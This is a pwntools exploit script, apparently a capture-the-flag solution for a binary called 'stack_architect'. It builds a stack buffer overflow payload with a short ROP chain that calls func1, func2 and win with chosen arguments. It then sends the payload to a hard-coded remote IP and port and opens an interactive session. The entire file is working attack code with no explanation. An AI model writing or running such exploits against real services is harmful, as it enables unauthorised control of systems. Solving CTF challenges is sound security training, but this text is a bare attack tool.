from pwn import *

BIN = "./stack_architect"
elf = ELF(BIN)
string_func1 = b"I'm sorry, don't leave me, I want you here with me ~~"
func1 = elf.sym['func1']
func2 = elf.sym['func2']
win = elf.sym['win']
pop_edi = 0x08049422 #0x08049422 : pop edi ; pop ebp ; ret

def exploit():
	# __breakpoint="""
	# 	b*0x08049391
	# """
	# gdb.attach(io,__breakpoint)
	payload = b"a"*4 + string_func1 + b"\x00" +b"c"*30 + p32(func1) + p32(func1) + p32(pop_edi) + p32(0x20010508) + p32(0x8052001) + p32(func2) + p32(win)
	io.sendline(payload)
	io.interactive()

#io = process(BIN)
io = remote("45.122.249.68", 10018)
context.log_level = "debug"
exploit()

